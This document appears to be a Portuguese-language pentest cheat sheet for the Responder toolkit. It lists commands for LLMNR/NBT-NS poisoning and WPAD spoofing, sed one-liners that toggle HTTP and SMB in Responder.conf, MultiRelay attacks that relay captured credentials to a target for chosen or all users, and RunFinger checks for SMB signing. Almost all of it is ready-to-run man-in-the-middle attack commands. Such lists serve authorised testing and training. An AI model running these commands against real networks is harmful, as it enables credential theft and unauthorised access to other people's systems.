# responder

% responder, LLMNR, NBT-NS, Poisoning, man in the middle

## iniciar responder
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder –I eth0
```

## iniciar responder - modo de análise (sem envenenamento)
#plateform/linux #target/remote #cat/RECON 
```
responder –I eth0 -A
```

## iniciar responder com um arquivo wpad
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder -I eth0 --wpad
```

## responder utilizando http ativado
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## responder utilizando http desativado
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## responder utilizando smb ativado
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

## responder utilizado smb desativado
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

## multirelay ataque - usuario filtrado (antes desative HTTP e SMB no arquivo Responder.conf)
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u <user1> <user2>
```

## multirelay ataque - todos usuários (antes desative HTTP e SMB no arquivo Responder.conf)
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u ALL
```

## runfinger - Utilidade relacionada ao responder que irá consultar um único endereço IP ou uma sub-rede IP e revelará se um alvo requer assinatura SMB ou não.
## runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.
#plateform/linux #target/remote #cat/RECON 
```
runfinger -i <network_range>
```
